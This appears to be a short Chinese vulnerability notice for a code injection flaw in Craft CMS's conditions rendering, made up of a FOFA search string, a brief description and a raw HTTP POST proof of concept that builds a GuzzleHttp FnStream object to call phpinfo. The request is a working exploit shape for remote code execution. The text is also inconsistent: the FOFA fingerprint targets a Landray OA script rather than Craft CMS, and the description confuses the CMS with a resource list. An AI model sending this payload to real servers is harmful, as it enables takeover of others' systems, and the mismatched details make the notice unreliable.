**fofa**

```
body="/Scripts/jquery.landray.dialog.js"
```

**一、漏洞简述**

Craft CMS 是一个基于PHP的开源内容管理系统，专为设计师、开发人员和内容创作者打造，以其灵活性、可扩展性和用户体验而知名。在其官方仓库中，有一个名为 Awesome Craft CMS 的项目，它是一个精选的资源列表，涵盖了插件、主题、教程及社区资源，帮助用户更好地利用Craft CMS进行网站开发。其接口/ConditionsController.php存在任意代码注入漏洞，攻击者可通过该漏洞注入恶意代码执行系统命令，从而控制该系统。

**二、漏洞检测poc**

```yaml
POST /ConditionsController.php HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Content-Length: 238

action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream",    "__construct()": [{"close":null}],"_fn_close":"phpinfo"}}

```

